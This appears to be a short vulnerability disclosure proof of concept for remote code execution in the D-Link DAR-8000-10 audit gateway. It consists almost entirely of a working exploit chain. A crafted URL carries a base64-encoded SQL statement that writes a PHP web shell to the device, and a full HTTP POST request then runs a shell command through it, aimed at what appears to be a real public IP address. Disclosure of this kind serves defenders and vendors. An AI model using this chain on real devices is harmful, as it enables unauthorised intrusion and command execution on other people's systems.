The D-LINK-DAR-8000-10 Online behavior audit gateway has rce vulnerabilities

official website:http://www.dlink.com.cn/

version:D-LINK  DAR-8000-10

See the login page.

![WPS图片(1)](https://github.com/PumpkinBridge/cve/assets/139355470/5bb966de-afbf-45cd-925c-13dd00550896)
Construct url:
https://ip:port/importhtml.php?type=exporthtmlmail&tab=tb_RCtrlLog&sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvc3lzMS5waHAn
After downloading
Then execute poc:
```
POST /app/sys1.php HTTP/1.1
Host: 60.22.74.195:8443
Cookie: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

cmd=id
```
![WPS图片(2)](https://github.com/PumpkinBridge/cve/assets/139355470/323aa964-8918-48f9-8b22-870457737654)
